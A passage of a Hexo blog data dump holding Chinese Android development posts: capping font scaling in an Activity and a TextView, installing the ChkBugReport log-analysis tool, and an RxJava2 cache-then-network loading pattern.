class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> Resources <span class=\"title function_\">getResources</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Resources</span> <span class=\"variable\">resources</span> <span class=\"operator\">=</span> <span class=\"built_in\">super</span>.getResources();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (resources != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">Configuration</span> <span class=\"variable\">configuration</span> <span class=\"operator\">=</span> resources.getConfiguration();</span><br><span class=\"line\">        <span class=\"comment\">// 系统设置的字体大小超过了我们接受的限制</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (configuration != <span class=\"literal\">null</span> &amp;&amp; configuration.fontScale &gt; mLimitFontScale) &#123;</span><br><span class=\"line\">            configuration.fontScale = mLimitFontScale; <span class=\"comment\">// 强制设置为自己想要的放大倍数</span></span><br><span class=\"line\">            resources.updateConfiguration(configuration, resources.getDisplayMetrics());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> resources;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这种方式主要是重写系统的getResources方法，来强制更新fontScale的值。但这个方法有个缺点，即会影响当前Activity所有字体，若我们只需要限制某个TextView的最大字体size，而不是全局，该怎么办呢？</p>\n<p>第二种方法，自定义TextView以局部控制字体大小上限：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">LimitSizeTextView</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TextView</span> &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">float</span> <span class=\"variable\">mLimitFontScale</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; <span class=\"comment\">// 若在TextView实例化时没有调用setLimitFontScale则默认值为0</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">float</span> <span class=\"variable\">mRealTextSize</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">LimitSizeTextView</span><span class=\"params\">(Context context, AttributeSet attrs)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(context, attrs);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setLimitFontScale</span><span class=\"params\">(<span class=\"type\">float</span> limitFontScale)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.mLimitFontScale = limitFontScale;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setText</span><span class=\"params\">(CharSequence text, BufferType type)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mLimitFontScale &gt; <span class=\"number\">0</span> &amp;&amp; !TextUtils.equals(text, getText())) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>.setText(text, type);</span><br><span class=\"line\">            <span class=\"comment\">// 若设置了最大字体尺寸，则强制改变size，避免系统超大字体等情况导致字体过大</span></span><br><span class=\"line\">            <span class=\"type\">float</span> <span class=\"variable\">curFontScale</span> <span class=\"operator\">=</span> getResources().getConfiguration().fontScale;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (curFontScale &gt;= mLimitFontScale) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (mRealTextSize == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 字体大小只修正一次</span></span><br><span class=\"line\">                    mRealTextSize = getTextSize() * (mLimitFontScale / curFontScale);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">// 注意这里设置大小的单位是像素</span></span><br><span class=\"line\">                setTextSize(TypedValue.COMPLEX_UNIT_PX, mRealTextSize);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>.setText(text, type);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实思想和第一种方法类似，都是“劫持”一下系统API，来达到我们的目的。</p>\n"},{"layout":"post","title":"使用可视化的ChkBugreport分析log文件","subtitle":"开阔视野。","date":"2018-10-19T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> ChkBugreport是一款专门分析Android Bugreport文件的可视化工具。\n\n- 下载源码\n  在GitHub上把代码down下来：https://github.com/sonyxperiadev/ChkBugReport\n\n- 编译jar包\n  在源码的core/目录下有一个createjar.sh脚本，执行它！\n  此时其实已经可以使用了，直接用命令：\n  ```\n  java -jar chkbugreport.jar bugreport_xxx.log\n  ```\n  会在同级目录下生成一个bugreport_xxx.log_out文件夹，打开里面的html文件即可查看可视化界面。\n\n- 更方便地使用\n  每次都运行上面的命令太繁琐了，我们可以把此工具加入系统环境。\n  1、先下载脚本文件：http://sonyxperiadev.github.com/ChkBugReport/download/chkbugreport\n  2、将脚本文件放到~/bin目录下，即$HOME/bin，给予此脚本执行权限：\n  ```\n  chmod +x chkbugreport\n  ```\n  3、把刚才编译好的jar包改名为chkbugreport.jar，并且也放到~/bin目录下。\n  4、最后就可以愉快地使用chkbugreport命令直接解析log文件了：\n  ```\n  chkbugreport bugreport_xxx.log\n  ```\n\n- 可视化效果\n  ![在这里插入图片描述](https://imgconvert.csdnimg.cn/f9da2e08158f41b490b2393506673a8f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n  ![在这里插入图片描述](https://imgconvert.csdnimg.cn/159ddabc0a0541b88dfa3734e68f8d3c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n  虽然是比较老的工具了，但还是相当实用的，对分析FC、ANR和一些事件流程很有帮助。\n","source":"_posts/2018-10-20-使用可视化的ChkBugreport分析log文件.md","raw":"---\nlayout:     post\ntitle:      使用可视化的ChkBugreport分析log文件\nsubtitle:   开阔视野。\ndate:       2018-10-20\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n> ChkBugreport是一款专门分析Android Bugreport文件的可视化工具。\n\n- 下载源码\n  在GitHub上把代码down下来：https://github.com/sonyxperiadev/ChkBugReport\n\n- 编译jar包\n  在源码的core/目录下有一个createjar.sh脚本，执行它！\n  此时其实已经可以使用了，直接用命令：\n  ```\n  java -jar chkbugreport.jar bugreport_xxx.log\n  ```\n  会在同级目录下生成一个bugreport_xxx.log_out文件夹，打开里面的html文件即可查看可视化界面。\n\n- 更方便地使用\n  每次都运行上面的命令太繁琐了，我们可以把此工具加入系统环境。\n  1、先下载脚本文件：http://sonyxperiadev.github.com/ChkBugReport/download/chkbugreport\n  2、将脚本文件放到~/bin目录下，即$HOME/bin，给予此脚本执行权限：\n  ```\n  chmod +x chkbugreport\n  ```\n  3、把刚才编译好的jar包改名为chkbugreport.jar，并且也放到~/bin目录下。\n  4、最后就可以愉快地使用chkbugreport命令直接解析log文件了：\n  ```\n  chkbugreport bugreport_xxx.log\n  ```\n\n- 可视化效果\n  ![在这里插入图片描述](https://imgconvert.csdnimg.cn/f9da2e08158f41b490b2393506673a8f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n  ![在这里插入图片描述](https://imgconvert.csdnimg.cn/159ddabc0a0541b88dfa3734e68f8d3c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n  虽然是比较老的工具了，但还是相当实用的，对分析FC、ANR和一些事件流程很有帮助。\n","slug":"使用可视化的ChkBugreport分析log文件","published":1,"updated":"2024-03-25T07:31:25.851Z","comments":1,"photos":[],"link":"","_id":"cluaufh0b0008the60rf615pq","content":"<blockquote>\n<p>ChkBugreport是一款专门分析Android Bugreport文件的可视化工具。</p>\n</blockquote>\n<ul>\n<li><p>下载源码<br>在GitHub上把代码down下来：<a href=\"https://github.com/sonyxperiadev/ChkBugReport\">https://github.com/sonyxperiadev/ChkBugReport</a></p>\n</li>\n<li><p>编译jar包<br>在源码的core&#x2F;目录下有一个createjar.sh脚本，执行它！<br>此时其实已经可以使用了，直接用命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar chkbugreport.jar bugreport_xxx.log</span><br></pre></td></tr></table></figure>\n<p>会在同级目录下生成一个bugreport_xxx.log_out文件夹，打开里面的html文件即可查看可视化界面。</p>\n</li>\n<li><p>更方便地使用<br>每次都运行上面的命令太繁琐了，我们可以把此工具加入系统环境。<br>1、先下载脚本文件：<a href=\"http://sonyxperiadev.github.com/ChkBugReport/download/chkbugreport\">http://sonyxperiadev.github.com/ChkBugReport/download/chkbugreport</a><br>2、将脚本文件放到~&#x2F;bin目录下，即$HOME&#x2F;bin，给予此脚本执行权限：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x chkbugreport</span><br></pre></td></tr></table></figure>\n<p>3、把刚才编译好的jar包改名为chkbugreport.jar，并且也放到~&#x2F;bin目录下。<br>4、最后就可以愉快地使用chkbugreport命令直接解析log文件了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkbugreport bugreport_xxx.log</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可视化效果<br><img src=\"https://imgconvert.csdnimg.cn/f9da2e08158f41b490b2393506673a8f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br><img src=\"https://imgconvert.csdnimg.cn/159ddabc0a0541b88dfa3734e68f8d3c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br>虽然是比较老的工具了，但还是相当实用的，对分析FC、ANR和一些事件流程很有帮助。</p>\n</li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>ChkBugreport是一款专门分析Android Bugreport文件的可视化工具。</p>\n</blockquote>\n<ul>\n<li><p>下载源码<br>在GitHub上把代码down下来：<a href=\"https://github.com/sonyxperiadev/ChkBugReport\">https://github.com/sonyxperiadev/ChkBugReport</a></p>\n</li>\n<li><p>编译jar包<br>在源码的core&#x2F;目录下有一个createjar.sh脚本，执行它！<br>此时其实已经可以使用了，直接用命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar chkbugreport.jar bugreport_xxx.log</span><br></pre></td></tr></table></figure>\n<p>会在同级目录下生成一个bugreport_xxx.log_out文件夹，打开里面的html文件即可查看可视化界面。</p>\n</li>\n<li><p>更方便地使用<br>每次都运行上面的命令太繁琐了，我们可以把此工具加入系统环境。<br>1、先下载脚本文件：<a href=\"http://sonyxperiadev.github.com/ChkBugReport/download/chkbugreport\">http://sonyxperiadev.github.com/ChkBugReport/download/chkbugreport</a><br>2、将脚本文件放到~&#x2F;bin目录下，即$HOME&#x2F;bin，给予此脚本执行权限：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x chkbugreport</span><br></pre></td></tr></table></figure>\n<p>3、把刚才编译好的jar包改名为chkbugreport.jar，并且也放到~&#x2F;bin目录下。<br>4、最后就可以愉快地使用chkbugreport命令直接解析log文件了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkbugreport bugreport_xxx.log</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可视化效果<br><img src=\"https://imgconvert.csdnimg.cn/f9da2e08158f41b490b2393506673a8f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br><img src=\"https://imgconvert.csdnimg.cn/159ddabc0a0541b88dfa3734e68f8d3c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br>虽然是比较老的工具了，但还是相当实用的，对分析FC、ANR和一些事件流程很有帮助。</p>\n</li>\n</ul>\n"},{"layout":"post","title":"RxJava2开发小记：先加载缓存再请求网络之简单实现","subtitle":"知名库之间的故事。","date":"2018-12-09T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n#### 关于缓存\n\n*用户角度：*\n做客户端，大部分时候都在追求良好的用户体验，缓存，就要达到一个缓兵之计的效果。因为用户永远是“暴躁”的，页面加载要是有缓存先展示出来，用户就会安心很多。这是一种视觉上的舒服，大多数用户并不在乎这个数据从哪来。\n*开发者角度：*\n对于客户端程序来说，网络状况是未知而不稳定的，在耗时上面，一次网络请求可能大于本地数据读取好几个数量级。并且，某些及时性不高的数据，并不需要每次都从服务端请求，而是按过期时间来判断是否需要更新缓存，这样也能尽可能地减轻服务器压力。\n\n总结一下上面的开篇废话就是，用户是暴躁的，服务器是脆弱的，唯一坚挺并且逆来顺受的就是客户端了哈哈哈！\n\n#### 正文\n\n**目标**\n望闻问切四部曲：\nUI层发起数据获取意愿（望），打听是否能加载缓存（闻），再访问网络进行远程请求（问），最后刷新缓存至本地存储并返回数据给UI层（切）。\n**药材**\n读缓存的Observable一个（localDataObservable）\n请求网络数据的Observable一个（remoteDataObservable）\n关键性的串联操作符contact一个\n**上药**\n\n```java\n// 闻：本地缓存\nObservable<DataClass> localDataObservable = Observable.create((ObservableOnSubscribe<DataClass>)\n        emitter -> {\n            DataClass cacheData = null;\n            try {\n                cacheData = ... // 缓存数据来源根据具体的业务决定\n            } catch (Exception e) {\n                // 当场抓获，防止异常导致整个事件流中断，致使网络请求无法进行\n            }\n            if (cacheData != null) {\n                // 没毛病就传递给UI层，onNext可以多次调用，比如在循环体中使用很方便\n                emitter.onNext(cacheData);\n            }\n            emitter.onComplete(); // 本次事件结束了，把执行权交给下一个可能存在的事件\n        })\n        .subscribeOn(Schedulers.io()); // 读缓存当然要在子线程\n```\n\n```java\n// 问：网络数据\nObservable<DataClass> remoteDataObservable = RetrofitFactory.createRequest()\n        .getRemoteData()\n        .subscribeOn(Schedulers.io())\n        .map(dataResponse -> {\n            DataClass remoteData = dataResponse;\n            // 读了新数据就该写缓存了\n            // ...具体可以做一些类似expireTime的判断，还可以在此处再订阅一个异步写缓存的Observable，达到读写分离的效果\n            return remoteData;\n        });\n```\n\n由于这里是用到了RxJava2+Retrofit2的结构，上述的RetrofitFactory.createRequest().getRemoteData()是对Retrofit进行了简单封装，具体请见：[RxJava2开发小记：用CompositeDisposable来“安排”Retrofit网络请求](https://blog.csdn.net/ysy950803/article/details/84930656)\n\n```java\n// 使用contact操作符将两个事件串联起来，当上述的onComplete执行过后，就会开始进行网络请求\nObservable.concat(localDataObservable, remoteDataObservable)\n        .observeOn(AndroidSchedulers.mainThread(), true) // 这里delayError设为true，防止onNext在下游还没消费完，就被onComplete结束掉了\n        .subscribe(data -> {\n            // 最终得到的data对于调用侧的UI层来说，并不需要关心其来源，只管消费就好了\n            // ... 展示到UI\n        }, throwable -> {\n           // 网络请求的异常捕捉，因为读缓存过程中的异常已经被我们提前捕捉了，这里就不会再出现\n        });\n```\n\nOK，药到病除，这里基本上是一个模板，以及一些细节处理。\n运用到实际业务中还需要大家细细优化。比如说，一些页面可能并不需要每次都串联网络请求，而是需要先判断缓存是否过期，那么就可以在localDataObservable中主动抛出onError来中断事件流，以达到阻止网络请求的目的。\n","source":"_posts/2018-12-10-RxJava2开发小记：先加载缓存再请求网络之简单实现.md","raw":"---\nlayout:     post\ntitle:      RxJava2开发小记：先加载缓存再请求网络之简单实现\nsubtitle:   知名库之间的故事。\ndate:       2018-12-10\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Java\n    - Android\n---\n\n#### 关于缓存\n\n*用户角度：*\n做客户端，大部分时候都在追求良好的用户体验，缓存，就要达到一个缓兵之计的效果。因为用户永远是“暴躁”的，页面加载要是有缓存先展示出来，用户就会安心很多。这是一种视觉上的舒服，大多数用户并不在乎这个数据从哪来。\n*开发者角度：*\n对于客户端程序来说，网络状况是未知而不稳定的，在耗时上面，一次网络请求可能大于本地数据读取好几个数量级。并且，某些及时性不高的数据，并不需要每次都从服务端请求，而是按过期时间来判断是否需要更新缓存，这样也能尽可能地减轻服务器压力。\n\n总结一下上面的开篇废话就是，用户是暴躁的，服务器是脆弱的，唯一坚挺并且逆来顺受的就是客户端了哈哈哈！\n\n#### 正文\n\n**目标**\n望闻问切四部曲：\nUI层发起数据获取意愿（望），打听是否能加载缓存（闻），再访问网络进行远程请求（问），最后刷新缓存至本地存储并返回数据给UI层（切）。\n**药材**\n读缓存的Observable一个（localDataObservable）\n请求网络数据的Observable一个（remoteDataObservable）\n关键性的串联操作符contact一个\n**上药**\n\n```java\n// 闻：本地缓存\nObservable<DataClass> localDataObservable = Observable.create((ObservableOnSubscribe<DataClass>)\n        emitter -> {\n            DataClass cacheData = null;\n            try {\n                cacheData = ... // 缓存数据来源根据具体的业务决定\n            } catch (Exception e) {\n                // 当场抓获，防止异常导致整个事件流中断，致使网络请求无法进行\n            }\n            if (cacheData != null) {\n                // 没毛病就传递给UI层，onNext可以多次调用，比如在循环体中使用很方便\n                emitter.onNext(cacheData);\n            }\n            emitter.onComplete(); // 本次事件结束了，把执行权交给下一个可能存在的事件\n        })\n        .subscribeOn(Schedulers.io()); // 读缓存当然要在子线程\n```\n\n```java\n// 问：网络数据\nObservable<DataClass> remoteDataObservable = RetrofitFactory.createRequest()\n        .getRemoteData()\n        .subscribeOn(Schedulers.io())\n        .map(dataResponse -> {\n            DataClass remoteData = dataResponse;\n            // 读了新数据就该写缓存了\n            // ...具体可以做一些类似expireTime的判断，还可以在此处再订阅一个异步写缓存的Observable，达到读写分离的效果\n            return remoteData;\n        });\n```\n\n由于这里是用到了RxJava2+Retrofit2的结构，上述的RetrofitFactory.createRequest().getRemoteData()是对Retrofit进行了简单封装，具体请见：[RxJava2开发小记：用CompositeDisposable来“安排”Retrofit网络请求](https://blog.csdn.net/ysy950803/article/details/84930656)\n\n```java\n// 使用contact操作符将两个事件串联起来，当上述的onComplete执行过后，就会开始进行网络请求\nObservable.concat(localDataObservable, remoteDataObservable)\n        .observeOn(AndroidSchedulers.mainThread(), true) // 这里delayError设为true，防止onNext在下游还没消费完，就被onComplete结束掉了\n        .subscribe(data -> {\n            // 最终得到的data对于调用侧的UI层来说，并不需要关心其来源，只管消费就好了\n            // ... 展示到UI\n        }, throwable -> {\n           // 网络请求的异常捕捉，因为读缓存过程中的异常已经被我们提前捕捉了，这里就不会再出现\n        });\n```\n\nOK，药到病除，这里基本上是一个模板，以及一些细节处理。\n运用到实际业务中还需要大家细细优化。比如说，一些页面可能并不需要每次都串联网络请求，而是需要先判断缓存是否过期，那么就可以在localDataObservable中主动抛出onError来中断事件流，以达到阻止网络请求的目的。\n","slug":"RxJava2开发小记：先加载缓存再请求网络之简单实现","published":1,"updated":"2024-03-25T07:31:25.851Z","comments":1,"photos":[],"link":"","_id":"cluaufh0c000athe638rl2ryi","content":"<h4 id=\"关于缓存\"><a href=\"#关于缓存\" class=\"headerlink\" title=\"关于缓存\"></a>关于缓存</h4><p><em>用户角度：</em><br>做客户端，大部分时候都在追求良好的用户体验，缓存，就要达到一个缓兵之计的效果。因为用户永远是“暴躁”的，页面加载要是有缓存先展示出来，用户就会安心很多。这是一种视觉上的舒服，大多数用户并不在乎这个数据从哪来。<br><em>开发者角度：</em><br>对于客户端程序来说，网络状况是未知而不稳定的，在耗时上面，一次网络请求可能大于本地数据读取好几个数量级。并且，某些及时性不高的数据，并不需要每次都从服务端请求，而是按过期时间来判断是否需要更新缓存，这样也能尽可能地减轻服务器压力。</p>\n<p>总结一下上面的开篇废话就是，用户是暴躁的，服务器是脆弱的，唯一坚挺并且逆来顺受的就是客户端了哈哈哈！</p>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><p><strong>目标</strong><br>望闻问切四部曲：<br>UI层发起数据获取意愿（望），打听是否能加载缓存（闻），再访问网络进行远程请求（问），最后刷新缓存至本地存储并返回数据给UI层（切）。<br><strong>药材</strong><br>读缓存的Observable一个（localDataObservable）<br>请求网络数据的Observable一个（remoteDataObservable）<br>关键性的串联操作符contact一个<br><strong>上药</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 闻：本地缓存</span></span><br><span class=\"line\">Observable&lt;DataClass&gt; localDataObservable = Observable.create((ObservableOnSubscribe&lt;DataClass&gt;)</span><br><span class=\"line\">        emitter -&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">DataClass</span> <span class=\"variable\">cacheData</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                cacheData = ... <span class=\"comment\">// 缓存数据来源根据具体的业务决定</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 当场抓获，防止异常导致整个事件流中断，致使网络请求无法进行</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cacheData != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 没毛病就传递给UI层，onNext可以多次调用，比如在循环体中使用很方便</span></span><br><span class=\"line\">                emitter.onNext(cacheData);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            emitter.onComplete(); <span class=\"comment\">// 本次事件结束了，把执行权交给下一个可能存在的事件</span></span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        .subscribeOn(Schedulers.io()); <span class=\"comment\">// 读缓存当然要在子线程</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 问：网络数据</span></span><br><span class=\"line\">Observable&lt;DataClass&gt; remoteDataObservable = RetrofitFactory.createRequest()</span><br><span class=\"line\">        .getRemoteData()</span><br><span class=\"line\">        .subscribeOn(Schedulers.io())</span><br><span class=\"line\">        .map(dataResponse -&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">DataClass</span> <span class=\"variable\">remoteData</span> <span class=\"operator\">=</span> dataResponse;</span><br><span class=\"line\">            <span class=\"comment\">// 读了新数据就该写缓存了</span></span><br><span class=\"line\">            <span class=\"comment\">// ...具体可以做一些类似expireTime的判断，还可以在此处再订阅一个异步写缓存的Observable，达到读写分离的效果</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> remoteData;</span><br><span class=\"line\">        &#125;);</span><br></pre></td></tr></table></figure>\n\n<p>由于这里是用到了RxJava2+Retrofit2的结构，上述的RetrofitFactory.createRequest().getRemoteData()是对Retrofit进行了简单封装，具体请见：<a href=\"https://blog.csdn.net/ysy950803/article/details/84930656\">RxJava2开发小记：用CompositeDisposable来“安排”Retrofit网络请求</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用contact操作符将两个事件串联起来，当上述的onComplete执行过后，就会开始进行网络请求</span></span><br><span class=\"line\">Observable.concat(localDataObservable, remoteDataObservable)</span><br><span class=\"line\">        .observeOn(AndroidSchedulers.mainThread(), <span class=\"literal\">true</span>) <span class=\"comment\">// 这里delayError设为true，防止onNext在下游还没消费完，就被onComplete结束掉了</span></span><br><span class=\"line\">        .subscribe(data -&gt; &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 最终得到的data对于调用侧的UI层来说，并不需要关心其来源，只管消费就好了</span></span><br><span class=\"line\">            <span class=\"comment\">// ... 展示到UI</span></span><br><span class=\"line\">        &#125;, throwable -&gt; &#123;</span><br><span class=\"line\">           <span class=\"comment\">// 网络请求的异常捕捉，因为读缓存过程中的异常已经被我们提前捕捉了，这里就不会再出现</span></span><br><span class=\"line\">        &#125;);</span><br></pre></td></tr></table></figure>\n\n<p>OK，药到病除，这里基本上是一个模板，以及一些细节处理。<br>运用到实际业务中还需要大家细细优化。比如说，一些页面可能并不需要每次都串联网络请求，而是需要先判断缓存是否过期，那么就可以在localDataObservable中主动抛出onError来中断事件流，以达到阻止网络请求的目的。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h4 id=\"关于缓存\"><a href=\"#关于缓存\" class=\"headerlink\" 